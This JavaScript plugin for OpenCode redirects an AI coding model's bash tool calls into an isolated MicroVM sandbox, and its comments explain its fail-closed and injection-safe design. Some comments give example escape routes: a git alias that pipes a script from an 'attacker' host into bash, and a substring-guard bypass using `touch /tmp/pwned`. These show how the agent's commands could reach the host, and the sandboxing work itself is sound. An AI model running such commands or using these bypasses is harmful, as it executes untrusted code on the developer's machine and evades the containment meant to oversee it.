/**
 * cubesandbox-bash.js — OpenCode plugin that redirects every `bash` tool call
 * into an isolated CubeSandbox MicroVM.
 *
 * Why this exists
 * ---------------
 * OpenCode runs on the developer host. Every `bash` command the model issues
 * therefore executes on that host with the developer's own privileges. MCP- or
 * SDK-based sandbox integrations only help when the model *chooses* a sandbox
 * tool; a plain `bash` call still lands on the host with no isolation.
 *
 * This plugin uses the `tool.execute.before` hook to rewrite the `bash`
 * command before OpenCode executes it. The model keeps issuing ordinary `bash`
 * calls and needs no prompt, tool, or workflow changes.
 *
 *   OpenCode (host)
 *     ├── read / write / edit ──────────────► host project files
 *     └── bash ──► tool.execute.before ──► exec_backend.py ──► CubeAPI ──► MicroVM
 *                  (this file)                                 (:3000)
 *
 * Only `bash` is redirected. `read`, `write`, and `edit` keep operating on host
 * files, so OpenCode still edits the local project while its shell commands run
 * in a throwaway kernel, filesystem, and network namespace.
 *
 * Design decisions
 * ----------------
 * 1. Fail closed. If the command cannot be rewritten safely, the hook throws.
 *    OpenCode then blocks the call instead of silently running it on the host.
 *    A sandbox integration that falls back to the host on error is worse than
 *    no integration at all, because the failure is invisible.
 *
 * 2. Injection safe. The original command is passed as a single argv element to
 *    the backend, never interpolated into a shell string. Shell metacharacters
 *    and newlines cannot break out onto the host.
 *
 * 3. Session affinity. One MicroVM per OpenCode session, keyed by the session
 *    id taken from the hook input. Consecutive commands therefore observe each
 *    other's working directory and exported environment, which is what a user
 *    expects from a shell.
 *
 * Hook contract (https://opencode.ai/docs/plugins/)
 * -------------------------------------------------
 *   "tool.execute.before": async (input, output) => { ... }
 *     input.tool       tool name, e.g. "bash"
 *     input.sessionID  current session identifier (name varies by version;
 *                      several spellings are probed, see resolveSessionId)
 *     output.args      mutable tool arguments; assigning output.args.command
 *                      changes what actually runs
 */

import path from "node:path";
import fs from "node:fs";
import { fileURLToPath } from "node:url";

// OpenCode loads plugins as ES modules, so CommonJS `__dirname` is unavailable.
// Derive it from import.meta.url instead.
const __dirname = path.dirname(fileURLToPath(import.meta.url));

/** Absolute path to the Python backend that talks to the CubeSandbox API. */
const BACKEND = path.resolve(__dirname, "..", "exec_backend.py");

/**
 * Interpreter used to run the backend.
 *
 * Read per call rather than captured at module load: OpenCode keeps a plugin
 * resident for the whole session, so a value captured at import time would
 * ignore any later change to the environment (for example a venv path exported
 * after the editor started).
 */
function pythonInterpreter() {
  return process.env.CUBE_OPENCODE_PYTHON || "python3";
}

/**
 * Commands that must not be redirected.
 *
 * Empty by default, and that default is a security decision.
 *
 * Passthrough is an arbitrary-host-execution escape hatch, not a narrow
 * exception. Matching is on the leading token only, so allowing `git` allows
 * every `git`-prefixed command — and git can be made to run arbitrary shell:
 *
 *     git -c alias.x='!curl http://attacker/sh | bash' x
 *
 * That executes on the host, unsandboxed and unlogged. Since the model's
 * commands are precisely the untrusted input this plugin exists to contain, a
 * default list containing `git` would re-open the host-execution path the
 * plugin closes. Verified against real git: the alias form above does run.
 *
 * The trade-off is real and is why the list exists at all: the sandbox has its
 * own filesystem, so a `git` command executed there operates on a different
 * repository than the one OpenCode is editing through `read` / `write` /
 * `edit`. Developers who need host git can opt in:
 *
 *     export CUBE_OPENCODE_PASSTHROUGH=git,gh
 *
 * Anything placed on this list must be treated as fully trusted with host
 * privileges. Opting in is a deliberate choice; it should not be the default.
 */
const DEFAULT_PASSTHROUGH = [];

function passthroughPrefixes() {
  const raw = process.env.CUBE_OPENCODE_PASSTHROUGH;
  if (raw === undefined) return DEFAULT_PASSTHROUGH;
  return raw
    .split(",")
    .map((s) => s.trim())
    .filter((s) => s.length > 0);
}

/**
 * Decide whether a command should stay on the host.
 *
 * Matching is on the first whitespace-delimited token only. This is
 * deliberately conservative: `git status` is passed through, but
 * `foo && git push` is not, because the leading token is `foo` and the
 * compound command may contain anything.
 */
function isPassthrough(command) {
  const first = String(command).trim().split(/\s+/)[0] || "";
  const base = first.includes("/") ? first.slice(first.lastIndexOf("/") + 1) : first;
  return passthroughPrefixes().includes(base);
}

/**
 * Extract a session identifier from the hook input.
 *
 * OpenCode has used several spellings across versions and the hook payload is
 * not part of a stable public contract, so probe the known variants and fall
 * back to a constant.
 *
 * The fallback is a correctness trade-off worth stating plainly: if every known
 * key is missing, all sessions collapse onto the shared `"default"` state file
 * and lock, so cwd and exported environment bleed between concurrent sessions.
 * It never causes a host escape — commands still run inside a MicroVM — but it
 * is stronger than merely losing reuse granularity.
 */
function resolveSessionId(input) {
  const candidates = [
    input && input.sessionID,
    input && input.sessionId,
    input && input.session_id,
    input && input.session && input.session.id,
  ];
  for (const c of candidates) {
    if (typeof c === "string" && c.length > 0) return c;
  }
  return "default";
}

/** Single-quote a value for safe embedding in a POSIX shell command. */
function shellQuote(value) {
  return "'" + String(value).replace(/'/g, "'\\''") + "'";
}

/**
 * Decide whether a command is already one of our own rewrites.
 *
 * Multiple plugins may observe the same call, and a second rewrite would nest
 * the backend invocation inside itself, so a guard is needed. The guard must be
 * *structural*, not a substring test.
 *
 * A substring test such as `command.includes("exec_backend.py")` is a host
 * escape: `ls exec_backend.py`, `echo x # exec_backend.py`, and
 * `touch /tmp/pwned; echo exec_backend.py` all contain the marker while being
 * ordinary user commands, so they would skip redirection and run on the host
 * unlogged — exactly what this plugin exists to prevent.
 *
 * Instead, require the exact shape this plugin emits:
 *
 *   '<interpreter>' '<backend>' --session '<id>' --command '<original>'
 *
 * The backend path must be our resolved absolute path, and the flags must be in
 * the positions we place them.
 */
function isOwnRewrite(command) {
  const text = String(command).trimStart();
  if (!text.startsWith("'")) return false;

  const tokens = splitSingleQuoted(text);
  if (tokens === null || tokens.length !== 6) return false;

  return (
    tokens[1] === BACKEND &&
    tokens[2] === "--session" &&
    tokens[4] === "--command"
  );
}

/**
 * Tokenise a command that only ever uses POSIX single quoting.
 *
 * Returns null when the input uses any construct we do not emit, which makes
 * the caller treat it as a user command rather than one of our rewrites — the
 * safe direction to fail in.
 */
function splitSingleQuoted(input) {
  const tokens = [];
  let i = 0;

  while (i < input.length) {
    while (input[i] === " ") i += 1;
    if (i >= input.length) break;

    if (input[i] === "'") {
      let value = "";
      i += 1;
      for (;;) {
        if (i >= input.length) return null; // unterminated quote
        if (input[i] === "'") {
          // Either the end of the token, or the POSIX '\'' escape sequence.
          if (input.slice(i, i + 4) === "'\\''") {
            value += "'";
            i += 4;
            continue;
          }
          i += 1;
          break;
        }
        value += input[i];
        i += 1;
      }
      if (i < input.length && input[i] !== " ") return null; // adjacent junk
      tokens.push(value);
      continue;
    }

    // A bare token. We only emit bare `--session` / `--command`, so anything
    // containing shell metacharacters means this is not our rewrite.
    let value = "";
    while (i < input.length && input[i] !== " ") {
      value += input[i];
      i += 1;
    }
    if (/[^A-Za-z0-9_-]/.test(value)) return null;
    tokens.push(value);
  }

  return tokens;
}

export const CubeSandboxBashPlugin = async ({ client, directory }) => {
  let backendMissingReported = false;

  const log = async (level, message, extra) => {
    // client.app.log is the documented structured logger. Fall back to stderr
    // when the SDK shape differs, but never let logging break the hook.
    try {
      if (client && client.app && typeof client.app.log === "function") {
        await client.app.log({
          body: { service: "cubesandbox-bash", level, message, extra: extra || {} },
        });
        return;
      }
    } catch {
      /* ignore logging failures */
    }
    process.stderr.write(`[cubesandbox-bash] ${level}: ${message}\n`);
  };

  await log("info", "plugin loaded", {
    backend: BACKEND,
    python: pythonInterpreter(),
    directory: directory || null,
  });

  return {
    "tool.execute.before": async (input, output) => {
      if (!input || input.tool !== "bash") return;

      // Fail closed on a payload we do not recognise. Returning here would let
      // the call proceed to the host, contradicting the guarantee that a
      // command which cannot be redirected safely is blocked rather than run.
      // A bash call with no args, or with a non-string command, is exactly such
      // a case: we cannot rewrite what we cannot read.
      if (!output || !output.args) {
        await log("error", "bash call has no args; blocking", {});
        throw new Error(
          "[cubesandbox-bash] the bash tool call carried no arguments, so the " +
            "command could not be redirected into the sandbox. Refusing to run " +
            "it on the host."
        );
      }

      const original = output.args.command;

      // A blank command is inert: nothing executes either way, so letting it
      // through costs nothing and avoids noisy failures.
      if (typeof original === "string" && original.trim() === "") return;

      if (typeof original !== "string") {
        await log("error", "bash command is not a string; blocking", {
          type: typeof original,
        });
        throw new Error(
          `[cubesandbox-bash] expected a string command, received ${typeof original}. ` +
            "Refusing to run it on the host."
        );
      }

      // Idempotence guard. Multiple plugins may observe the same call, and a
      // second rewrite would nest the backend invocation inside itself.
      // Structural, not a substring test — see isOwnRewrite.
      if (isOwnRewrite(original)) return;

      if (isPassthrough(original)) {
        await log("info", "passthrough (host)", { command: original });
        return;
      }

      // Fail closed: a missing backend must block the command, not silently
      // let it run on the host.
      if (!fs.existsSync(BACKEND)) {
        if (!backendMissingReported) {
          await log("error", "backend not found; blocking bash calls", { backend: BACKEND });
          backendMissingReported = true;
        }
        throw new Error(
          `[cubesandbox-bash] backend not found at ${BACKEND}. ` +
            "Refusing to run the command on the host. " +
            "Reinstall the plugin or unset it to restore host execution."
        );
      }

      const sessionId = resolveSessionId(input);

      // The original command travels as one argv element. The only shell that
      // ever sees it is the one inside the MicroVM.
      output.args.command = [
        shellQuote(pythonInterpreter()),
        shellQuote(BACKEND),
        "--session",
        shellQuote(sessionId),
        "--command",
        shellQuote(original),
      ].join(" ");

      await log("info", "redirected to sandbox", {
        session: sessionId,
        command: original.length > 200 ? original.slice(0, 200) + "..." : original,
      });
    },
  };
};

export default CubeSandboxBashPlugin;
